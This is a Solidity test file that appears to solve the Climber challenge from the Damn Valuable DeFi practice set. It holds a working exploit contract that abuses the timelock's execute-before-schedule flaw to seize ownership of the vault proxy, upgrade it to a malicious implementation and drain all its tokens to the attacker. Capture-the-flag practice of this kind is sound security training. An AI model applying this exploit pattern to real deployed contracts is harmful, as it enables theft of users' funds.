// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "./utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
import "forge-std/Test.sol";


import {DamnValuableToken} from "../DamnValuableToken.sol";
import {ClimberTimelock} from "../climber/ClimberTimelock.sol";
import {ClimberVault} from "../climber/ClimberVault.sol";

interface IERC20 {
     function transfer(address to, uint256 amount) external returns (bool);
}
contract Payload {
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt = 0x0;
    ClimberTimelock climbertimelock;
    ERC1967Proxy internal climberVaultProxy;
    ClimberVault internal climberimpl;
    DamnValuableToken dvt;
    address public attacker;

    constructor(ClimberTimelock _climbertimelock,
                ERC1967Proxy _climberVaultProxy,
                ClimberVault _climberimpl, 
                DamnValuableToken _dvt
    ) {
        climbertimelock = _climbertimelock;
        climberVaultProxy = _climberVaultProxy;
        climberimpl = _climberimpl;
        attacker = msg.sender;
        dvt = _dvt;
    }

    function Start() public {
        bytes memory updateDelay_func_sign = abi.encodeWithSelector(climbertimelock.updateDelay.selector, 0);
        bytes memory  grantRole_func_sign = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
        bytes memory transferOwnership_func_sign = abi.encodeWithSignature("transferOwnership(address)", address(this));
        bytes memory schedule_func_sign = abi.encodeWithSelector(this.schedule.selector);
        bytes memory upgradeTo_func_sign = abi.encodeWithSignature("upgradeTo(address)", address(new newImpl()));
        bytes memory attack_func_sign = abi.encodeWithSignature("attack(address)", address(dvt));
        targets = [address(climbertimelock), address(climbertimelock), address(climberVaultProxy), address(this)];
        values = [0, 0, 0, 0];
        dataElements = [updateDelay_func_sign, grantRole_func_sign, transferOwnership_func_sign, schedule_func_sign];
        

        climbertimelock.execute(targets, values, dataElements, salt);
        address(climberVaultProxy).call(upgradeTo_func_sign);
        address(climberVaultProxy).call(attack_func_sign);

    }

    function schedule() public{
        climbertimelock.schedule(targets, values, dataElements, salt);
    }
}    

contract newImpl is UUPSUpgradeable {
    function attack(address _dvt) public {
        IERC20(_dvt).transfer(tx.origin, 10_000_000e18);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    Payload internal payload;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;


    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);
    }

    function testExploit() public {

        vm.startPrank(attacker, attacker);
        payload = new Payload(climberTimelock, climberVaultProxy, climberImplementation, dvt);
        payload.Start();
        vm.stopPrank();
        verify();
    }

    function verify() internal {
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}